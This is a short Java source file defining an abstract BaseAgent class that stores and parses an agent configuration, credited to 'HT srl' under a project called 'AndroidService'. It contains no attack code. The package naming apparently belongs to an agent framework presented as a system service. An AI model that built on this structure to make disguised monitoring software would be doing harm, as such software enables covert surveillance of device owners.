/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.service.agent;

import com.android.service.ThreadBase;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfigurationException;
import com.android.service.util.Check;

/**
 * The Class AgentBase.
 */
public abstract class BaseAgent extends ThreadBase {
	private static final String TAG = "AgentBase"; //$NON-NLS-1$
	private AgentConf conf;

	/**
	 * Parses the.
	 * 
	 * @param conf
	 *            the conf
	 * @throws ConfigurationException 
	 */
	protected abstract boolean parse(AgentConf conf);
	
	public String getType(){
		if (Cfg.DEBUG) {
			Check.requires(conf != null, "null conf");
		}
		return conf.getType();
	}

	public boolean setConf(AgentConf conf) {
		if (Cfg.DEBUG) {
			Check.requires(conf != null, "null conf");
		}
		this.conf = conf;
		return parse(conf);
	}

}